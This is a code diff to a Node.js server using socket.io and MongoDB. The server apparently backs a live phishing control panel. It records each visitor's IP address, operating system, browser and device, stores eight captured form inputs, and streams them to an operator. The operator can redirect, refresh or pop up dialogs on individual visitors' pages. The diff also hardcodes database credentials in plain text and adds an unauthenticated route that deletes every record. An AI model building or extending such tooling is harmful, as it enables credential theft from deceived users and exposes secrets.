@@ -17,6 +17,9 @@ mongoose.connect('mongodb+srv://ilyes:Ilyes123@cluster0.mtghl.mongodb.net/?retry
 
 const userSchema = new mongoose.Schema({
     ipAddress: { type: String },
+    os: { type: String },
+    browserName: { type: String },
+    deviceName: { type: String },
     userId: { type: String },
     datetime: { type: String },
     span: { type: String },
@@ -29,6 +32,7 @@ const userSchema = new mongoose.Schema({
     input7: { type: String },
     input8: { type: String },
     active: { type: Boolean },
+    popupOpen: { type: Boolean },
 });
   
 // Create a model based on the schema
@@ -38,6 +42,21 @@ const User = mongoose.model('User', userSchema);
 app.get('/', (req, res) => {
   // Send the index.html file
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.get('/b', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'page-b.html'));
+});
+
+app.get('/c', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'page-c.html'));
+});
+
+// Handle root route
+app.get('/elete', (req, res) => {
+  // Send the index.html file
+  User.deleteMany({})
+  .then(() => console.log('ss'))
 });
 
 // Handle admin route
@@ -66,6 +85,9 @@ io.on('connection', (socket) => {
         socket.broadcast.emit('updateTable', data)
         const user = new User({
             ipAddress: data.ipAddress,
+            os: data.os,
+            browserName: data.browserName,
+            deviceName: data.device,
             userId: data.userId,
             datetime: data.datetime,
             span: data.span,
@@ -77,16 +99,75 @@ io.on('connection', (socket) => {
             input6: data.input6,
             input7: data.input7,
             input8: data.input8,
-            active: true
+            active: true,
+            popupOpen: data.popupOpen
         })
         user.save()
     });
 
+    socket.on('formUpdate', (data) => {
+        socket.broadcast.emit('updateRow', data)
+        User.findOneAndUpdate(
+            { 'userId': data.userId }, 
+            {
+                span: data.span,
+                input1: data.input1,
+                input2: data.input2,
+                input3: data.input3,
+                input4: data.input4,
+                input5: data.input5,
+                input6: data.input6,
+                input7: data.input7,
+                input8: data.input8,
+                popupOpen: data.popupOpen
+            }
+        )
+        .then(() => console.log('updated'))
+    });
+
+    socket.on('handlePopup', (userId, popupState) => {
+        socket.broadcast.emit('handlePopup', userId, popupState)
+        User.findOneAndUpdate(
+            { 'userId': userId }, 
+            { popupOpen: popupState }
+        )
+        .then(() => console.log('updated'))
+    });
+
     socket.on('redirect', (data, url) => {
-        // axios.get(url).then((response) => {
-        //     socket.broadcast.emit('redirect', data, response.data)
-        // })
         socket.broadcast.emit('redirect', data, url)
+    });
+
+    socket.on('openPopup', (userId) => {
+        socket.broadcast.emit('openPopup', userId)
+    });
+
+    socket.on('closePopup', (userId) => {
+        socket.broadcast.emit('closePopup', userId)
+    });
+
+    socket.on('userClosedPage', (userId) => {
+        socket.broadcast.emit('userClosedPage', userId)
+    });
+    
+    socket.on('confirmClosed', (userId) => {
+        User.findOneAndUpdate({ 'userId': userId }, { 'active': false }).then(() => console.log('deleted'))
+    });
+
+    socket.on('refreshPage', (userId) => {
+        socket.broadcast.emit('refreshPage', userId)
+    });
+
+    socket.on('checkClosed', (userId) => {
+        socket.broadcast.emit('checkClosed', userId)
+    });
+
+    socket.on('closeResponse', (userId) => {
+        socket.broadcast.emit('closeResponse', userId)
+    });
+
+    socket.on('userRedirect', (userId, page) => {
+        socket.broadcast.emit('userRedirect', userId, page)
     });
 
     socket.on('finish', (data, link) => {
@@ -97,7 +178,7 @@ io.on('connection', (socket) => {
 
     socket.on('popupClose', (data) => {
         io.emit('closePopup', data, '')
-        User.findOneAndUpdate({ 'userId': data }, { 'active': false }).then(() => console.log('deleted'))
+        User.findOneAndUpdate({ 'userId': data.userId }, { 'active': false }).then(() => console.log('deleted'))
     });
 
     socket.on('disconnect', () => {
